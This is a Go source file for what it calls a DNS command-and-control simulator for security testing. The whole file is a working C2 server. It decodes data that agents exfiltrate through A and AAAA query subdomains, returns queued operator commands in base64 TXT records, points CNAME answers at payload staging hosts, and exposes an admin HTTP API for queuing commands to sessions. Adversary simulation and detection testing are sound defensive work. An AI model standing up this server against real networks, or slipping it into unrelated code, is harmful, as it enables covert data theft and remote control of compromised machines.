// Mirqab Cloud Relay - DNS C2 Simulator
// Simulates DNS-based Command & Control tunneling for security testing
package main

import (
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/miekg/dns"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"net/http"
)

// -----------------------------------------------------------------------------
// Configuration
// -----------------------------------------------------------------------------

type Config struct {
	DNSPort        int           `json:"dns_port"`
	MetricsPort    int           `json:"metrics_port"`
	TenantID       string        `json:"tenant_id"`
	BaseDomain     string        `json:"base_domain"`
	MaxSessionAge  time.Duration `json:"max_session_age"`
	MaxQueryLength int           `json:"max_query_length"`
	EnableLogging  bool          `json:"enable_logging"`
	RedisURL       string        `json:"redis_url"`
}

func defaultConfig() *Config {
	return &Config{
		DNSPort:        53,
		MetricsPort:    9091,
		TenantID:       os.Getenv("TENANT_ID"),
		BaseDomain:     os.Getenv("BASE_DOMAIN"),
		MaxSessionAge:  30 * time.Minute,
		MaxQueryLength: 253,
		EnableLogging:  true,
		RedisURL:       os.Getenv("REDIS_URL"),
	}
}

// -----------------------------------------------------------------------------
// Data Models
// -----------------------------------------------------------------------------

// DNSSession represents an active DNS tunneling session
type DNSSession struct {
	ID             string            `json:"id"`
	TenantID       string            `json:"tenant_id"`
	AgentID        string            `json:"agent_id"`
	SourceIP       string            `json:"source_ip"`
	FirstSeen      time.Time         `json:"first_seen"`
	LastSeen       time.Time         `json:"last_seen"`
	QueryCount     int64             `json:"query_count"`
	BytesExfiled   int64             `json:"bytes_exfiled"`
	BytesReceived  int64             `json:"bytes_received"`
	Status         string            `json:"status"`
	DataBuffer     []byte            `json:"-"`
	Metadata       map[string]string `json:"metadata"`
	mu             sync.RWMutex
}

// DNSQuery represents a decoded DNS query
type DNSQuery struct {
	SessionID   string `json:"session_id"`
	AgentID     string `json:"agent_id"`
	MessageType string `json:"message_type"`
	Sequence    int    `json:"sequence"`
	Data        []byte `json:"data"`
	Checksum    string `json:"checksum"`
}

// DNSResponse represents data to be sent back via DNS
type DNSResponse struct {
	SessionID string   `json:"session_id"`
	Commands  []string `json:"commands"`
	Status    string   `json:"status"`
}

// -----------------------------------------------------------------------------
// Session Manager
// -----------------------------------------------------------------------------

type DNSSessionManager struct {
	sessions map[string]*DNSSession
	tasks    map[string][]string
	config   *Config
	mu       sync.RWMutex
}

func NewDNSSessionManager(config *Config) *DNSSessionManager {
	sm := &DNSSessionManager{
		sessions: make(map[string]*DNSSession),
		tasks:    make(map[string][]string),
		config:   config,
	}

	go sm.cleanupExpiredSessions()
	return sm
}

func (sm *DNSSessionManager) GetOrCreateSession(agentID string, sourceIP string) *DNSSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	// Look for existing session by agent ID
	for _, session := range sm.sessions {
		if session.AgentID == agentID {
			session.LastSeen = time.Now()
			session.QueryCount++
			return session
		}
	}

	// Create new session
	sessionID := uuid.New().String()[:8]
	now := time.Now()

	session := &DNSSession{
		ID:         sessionID,
		TenantID:   sm.config.TenantID,
		AgentID:    agentID,
		SourceIP:   sourceIP,
		FirstSeen:  now,
		LastSeen:   now,
		QueryCount: 1,
		Status:     "active",
		DataBuffer: []byte{},
		Metadata:   make(map[string]string),
	}

	sm.sessions[sessionID] = session
	dnsSessionsActive.Inc()

	log.Info().
		Str("session_id", sessionID).
		Str("agent_id", agentID).
		Str("source_ip", sourceIP).
		Msg("New DNS tunneling session")

	return session
}

func (sm *DNSSessionManager) GetSession(sessionID string) (*DNSSession, bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	session, exists := sm.sessions[sessionID]
	return session, exists
}

func (sm *DNSSessionManager) AppendData(sessionID string, data []byte) {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if session, exists := sm.sessions[sessionID]; exists {
		session.DataBuffer = append(session.DataBuffer, data...)
		session.BytesExfiled += int64(len(data))
		dnsBytesExfiltrated.Add(float64(len(data)))
	}
}

func (sm *DNSSessionManager) QueueCommand(sessionID string, command string) {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if _, exists := sm.tasks[sessionID]; !exists {
		sm.tasks[sessionID] = []string{}
	}
	sm.tasks[sessionID] = append(sm.tasks[sessionID], command)
}

func (sm *DNSSessionManager) GetPendingCommands(sessionID string) []string {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if commands, exists := sm.tasks[sessionID]; exists {
		sm.tasks[sessionID] = []string{}
		return commands
	}
	return nil
}

func (sm *DNSSessionManager) GetAllSessions() []*DNSSession {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	sessions := make([]*DNSSession, 0, len(sm.sessions))
	for _, s := range sm.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

func (sm *DNSSessionManager) cleanupExpiredSessions() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		sm.mu.Lock()
		now := time.Now()
		for id, session := range sm.sessions {
			if now.Sub(session.LastSeen) > sm.config.MaxSessionAge {
				delete(sm.sessions, id)
				delete(sm.tasks, id)
				dnsSessionsActive.Dec()
				log.Info().Str("session_id", id).Msg("DNS session expired")
			}
		}
		sm.mu.Unlock()
	}
}

// -----------------------------------------------------------------------------
// Prometheus Metrics
// -----------------------------------------------------------------------------

var (
	dnsQueriesTotal = prometheus.NewCounterVec(prometheus.CounterOpts{
		Name: "c2_dns_queries_total",
		Help: "Total DNS queries received",
	}, []string{"type"})

	dnsSessionsActive = prometheus.NewGauge(prometheus.GaugeOpts{
		Name: "c2_dns_sessions_active",
		Help: "Number of active DNS tunneling sessions",
	})

	dnsBytesExfiltrated = prometheus.NewCounter(prometheus.CounterOpts{
		Name: "c2_dns_bytes_exfiltrated_total",
		Help: "Total bytes exfiltrated via DNS",
	})

	dnsQueryLatency = prometheus.NewHistogram(prometheus.HistogramOpts{
		Name:    "c2_dns_query_latency_seconds",
		Help:    "DNS query processing latency",
		Buckets: prometheus.DefBuckets,
	})

	dnsErrorsTotal = prometheus.NewCounterVec(prometheus.CounterOpts{
		Name: "c2_dns_errors_total",
		Help: "Total DNS errors",
	}, []string{"type"})
)

func init() {
	prometheus.MustRegister(dnsQueriesTotal)
	prometheus.MustRegister(dnsSessionsActive)
	prometheus.MustRegister(dnsBytesExfiltrated)
	prometheus.MustRegister(dnsQueryLatency)
	prometheus.MustRegister(dnsErrorsTotal)
}

// -----------------------------------------------------------------------------
// DNS Server
// -----------------------------------------------------------------------------

type DNSServer struct {
	config   *Config
	sessions *DNSSessionManager
	server   *dns.Server
}

func NewDNSServer(config *Config) *DNSServer {
	server := &DNSServer{
		config:   config,
		sessions: NewDNSSessionManager(config),
	}
	return server
}

// handleDNS processes incoming DNS queries
func (s *DNSServer) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	start := time.Now()
	defer func() {
		dnsQueryLatency.Observe(time.Since(start).Seconds())
	}()

	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	if len(r.Question) == 0 {
		w.WriteMsg(m)
		return
	}

	q := r.Question[0]
	qname := strings.ToLower(q.Name)

	dnsQueriesTotal.WithLabelValues(dns.TypeToString[q.Qtype]).Inc()

	// Extract source IP
	sourceIP := ""
	if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
		sourceIP = addr.IP.String()
	}

	if s.config.EnableLogging {
		log.Debug().
			Str("query", qname).
			Str("type", dns.TypeToString[q.Qtype]).
			Str("source", sourceIP).
			Msg("DNS query received")
	}

	// Check if query is for our domain
	if !strings.HasSuffix(qname, s.config.BaseDomain+".") {
		// Not our domain, return NXDOMAIN
		m.Rcode = dns.RcodeNameError
		w.WriteMsg(m)
		return
	}

	// Process based on query type
	switch q.Qtype {
	case dns.TypeA:
		s.handleARecord(m, qname, sourceIP)
	case dns.TypeAAAA:
		s.handleAAAARecord(m, qname, sourceIP)
	case dns.TypeTXT:
		s.handleTXTRecord(m, qname, sourceIP)
	case dns.TypeCNAME:
		s.handleCNAMERecord(m, qname, sourceIP)
	case dns.TypeMX:
		s.handleMXRecord(m, qname, sourceIP)
	default:
		// Return empty response for unsupported types
		m.Rcode = dns.RcodeSuccess
	}

	w.WriteMsg(m)
}

// handleARecord processes A record queries (beacon check-in)
func (s *DNSServer) handleARecord(m *dns.Msg, qname string, sourceIP string) {
	// Parse subdomain for encoded data
	// Format: <encoded_data>.<session_id>.<base_domain>
	parts := strings.Split(strings.TrimSuffix(qname, "."+s.config.BaseDomain+"."), ".")

	if len(parts) < 2 {
		// Simple beacon check-in
		agentID := parts[0]
		session := s.sessions.GetOrCreateSession(agentID, sourceIP)

		// Return IP encoding session info
		// First octet: status (1=active, 2=pending command)
		// Remaining octets: encoded session ID
		status := byte(1)
		if commands := s.sessions.GetPendingCommands(session.ID); len(commands) > 0 {
			status = 2
			s.sessions.mu.Lock()
			s.sessions.tasks[session.ID] = commands // Put back
			s.sessions.mu.Unlock()
		}

		// Generate response IP
		ip := net.IPv4(status, hashToByte(session.ID, 0), hashToByte(session.ID, 1), hashToByte(session.ID, 2))

		rr := &dns.A{
			Hdr: dns.RR_Header{Name: qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   ip,
		}
		m.Answer = append(m.Answer, rr)
		return
	}

	// Data exfiltration via A record
	encodedData := parts[0]
	sessionOrAgent := parts[1]

	// Decode data (base32 without padding)
	data, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encodedData))
	if err != nil {
		dnsErrorsTotal.WithLabelValues("decode_error").Inc()
		m.Rcode = dns.RcodeServerFailure
		return
	}

	// Get or create session
	session := s.sessions.GetOrCreateSession(sessionOrAgent, sourceIP)
	s.sessions.AppendData(session.ID, data)

	// Return acknowledgment IP
	ip := net.IPv4(0x0a, 0x00, 0x00, byte(len(data)))
	rr := &dns.A{
		Hdr: dns.RR_Header{Name: qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
		A:   ip,
	}
	m.Answer = append(m.Answer, rr)
}

// handleAAAARecord processes AAAA record queries (larger data chunks)
func (s *DNSServer) handleAAAARecord(m *dns.Msg, qname string, sourceIP string) {
	parts := strings.Split(strings.TrimSuffix(qname, "."+s.config.BaseDomain+"."), ".")

	if len(parts) < 2 {
		// Return loopback IPv6 for simple check
		ip := net.ParseIP("::1")
		rr := &dns.AAAA{
			Hdr:  dns.RR_Header{Name: qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 60},
			AAAA: ip,
		}
		m.Answer = append(m.Answer, rr)
		return
	}

	// Data exfiltration - AAAA allows more data per query
	encodedData := parts[0]
	sessionOrAgent := parts[1]

	data, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(encodedData))
	if err != nil {
		dnsErrorsTotal.WithLabelValues("decode_error").Inc()
		return
	}

	session := s.sessions.GetOrCreateSession(sessionOrAgent, sourceIP)
	s.sessions.AppendData(session.ID, data)

	// Return acknowledgment IPv6
	ip := net.ParseIP(fmt.Sprintf("2001:db8::%x:%x", len(data), session.QueryCount%256))
	rr := &dns.AAAA{
		Hdr:  dns.RR_Header{Name: qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 60},
		AAAA: ip,
	}
	m.Answer = append(m.Answer, rr)
}

// handleTXTRecord processes TXT record queries (command delivery)
func (s *DNSServer) handleTXTRecord(m *dns.Msg, qname string, sourceIP string) {
	parts := strings.Split(strings.TrimSuffix(qname, "."+s.config.BaseDomain+"."), ".")

	if len(parts) < 1 {
		return
	}

	sessionOrAgent := parts[0]
	session := s.sessions.GetOrCreateSession(sessionOrAgent, sourceIP)

	// Get pending commands
	commands := s.sessions.GetPendingCommands(session.ID)

	var txtValue string
	if len(commands) > 0 {
		// Encode commands as JSON, then base64
		cmdData, _ := json.Marshal(commands)
		txtValue = base64.StdEncoding.EncodeToString(cmdData)
	} else {
		// Return session status
		status := DNSResponse{
			SessionID: session.ID,
			Status:    "active",
			Commands:  []string{},
		}
		statusData, _ := json.Marshal(status)
		txtValue = base64.StdEncoding.EncodeToString(statusData)
	}

	// Split TXT value if too long (max 255 chars per string)
	txtStrings := splitTXTRecord(txtValue, 255)

	rr := &dns.TXT{
		Hdr: dns.RR_Header{Name: qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
		Txt: txtStrings,
	}
	m.Answer = append(m.Answer, rr)

	session.BytesReceived += int64(len(txtValue))
}

// handleCNAMERecord processes CNAME queries (redirect/staging)
func (s *DNSServer) handleCNAMERecord(m *dns.Msg, qname string, sourceIP string) {
	parts := strings.Split(strings.TrimSuffix(qname, "."+s.config.BaseDomain+"."), ".")

	if len(parts) < 1 {
		return
	}

	// Return a CNAME pointing to a payload staging location
	target := fmt.Sprintf("payload-%s.cdn.%s.", parts[0], s.config.BaseDomain)

	rr := &dns.CNAME{
		Hdr:    dns.RR_Header{Name: qname, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 300},
		Target: target,
	}
	m.Answer = append(m.Answer, rr)
}

// handleMXRecord processes MX queries (alternative C2 channel)
func (s *DNSServer) handleMXRecord(m *dns.Msg, qname string, sourceIP string) {
	// Return MX record pointing to mail server (for SMTP-based C2)
	mx := fmt.Sprintf("mail.%s.", s.config.BaseDomain)

	rr := &dns.MX{
		Hdr:        dns.RR_Header{Name: qname, Rrtype: dns.TypeMX, Class: dns.ClassINET, Ttl: 3600},
		Preference: 10,
		Mx:         mx,
	}
	m.Answer = append(m.Answer, rr)
}

// -----------------------------------------------------------------------------
// Helper Functions
// -----------------------------------------------------------------------------

func hashToByte(s string, idx int) byte {
	h := []byte(s)
	if idx < len(h) {
		return h[idx]
	}
	return 0
}

func splitTXTRecord(s string, maxLen int) []string {
	var result []string
	for len(s) > maxLen {
		result = append(result, s[:maxLen])
		s = s[maxLen:]
	}
	if len(s) > 0 {
		result = append(result, s)
	}
	return result
}

// -----------------------------------------------------------------------------
// Admin HTTP Server
// -----------------------------------------------------------------------------

func (s *DNSServer) startAdminServer() {
	mux := http.NewServeMux()

	// Metrics
	mux.Handle("/metrics", promhttp.Handler())

	// Health
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":    "healthy",
			"tenant_id": s.config.TenantID,
			"timestamp": time.Now().UTC(),
		})
	})

	// Sessions list
	mux.HandleFunc("/admin/sessions", func(w http.ResponseWriter, r *http.Request) {
		// Check admin token
		if r.Header.Get("X-Admin-Token") != os.Getenv("ADMIN_TOKEN") {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}

		sessions := s.sessions.GetAllSessions()
		json.NewEncoder(w).Encode(map[string]interface{}{
			"tenant_id": s.config.TenantID,
			"count":     len(sessions),
			"sessions":  sessions,
		})
	})

	// Queue command
	mux.HandleFunc("/admin/sessions/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		if r.Header.Get("X-Admin-Token") != os.Getenv("ADMIN_TOKEN") {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}

		// Extract session ID from URL
		sessionID := strings.TrimPrefix(r.URL.Path, "/admin/sessions/")
		sessionID = strings.TrimSuffix(sessionID, "/task")

		var req struct {
			Command string `json:"command"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid request", http.StatusBadRequest)
			return
		}

		s.sessions.QueueCommand(sessionID, req.Command)
		json.NewEncoder(w).Encode(map[string]string{"status": "queued"})
	})

	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", s.config.MetricsPort),
		Handler: mux,
	}

	log.Info().Int("port", s.config.MetricsPort).Msg("Starting admin/metrics server")
	if err := server.ListenAndServe(); err != http.ErrServerClosed {
		log.Error().Err(err).Msg("Admin server error")
	}
}

// -----------------------------------------------------------------------------
// Server Lifecycle
// -----------------------------------------------------------------------------

func (s *DNSServer) Run() error {
	// Start admin/metrics server
	go s.startAdminServer()

	// Configure DNS server
	s.server = &dns.Server{
		Addr:    fmt.Sprintf(":%d", s.config.DNSPort),
		Net:     "udp",
		Handler: dns.HandlerFunc(s.handleDNS),
	}

	// Also start TCP server for larger queries
	tcpServer := &dns.Server{
		Addr:    fmt.Sprintf(":%d", s.config.DNSPort),
		Net:     "tcp",
		Handler: dns.HandlerFunc(s.handleDNS),
	}

	// Graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Info().Msg("Shutting down DNS server...")
		s.server.Shutdown()
		tcpServer.Shutdown()
	}()

	// Start TCP in goroutine
	go func() {
		log.Info().Int("port", s.config.DNSPort).Msg("Starting DNS server (TCP)")
		if err := tcpServer.ListenAndServe(); err != nil {
			log.Error().Err(err).Msg("TCP DNS server error")
		}
	}()

	log.Info().
		Int("port", s.config.DNSPort).
		Str("base_domain", s.config.BaseDomain).
		Str("tenant_id", s.config.TenantID).
		Msg("Starting DNS C2 simulator (UDP)")

	return s.server.ListenAndServe()
}

// -----------------------------------------------------------------------------
// Main
// -----------------------------------------------------------------------------

func main() {
	// Setup logging
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: time.RFC3339})

	config := defaultConfig()

	// Override from environment
	if port := os.Getenv("DNS_PORT"); port != "" {
		fmt.Sscanf(port, "%d", &config.DNSPort)
	}
	if domain := os.Getenv("BASE_DOMAIN"); domain != "" {
		config.BaseDomain = domain
	}
	if config.BaseDomain == "" {
		config.BaseDomain = "c2.example.com"
	}

	server := NewDNSServer(config)
	if err := server.Run(); err != nil {
		log.Fatal().Err(err).Msg("DNS server failed")
	}
}
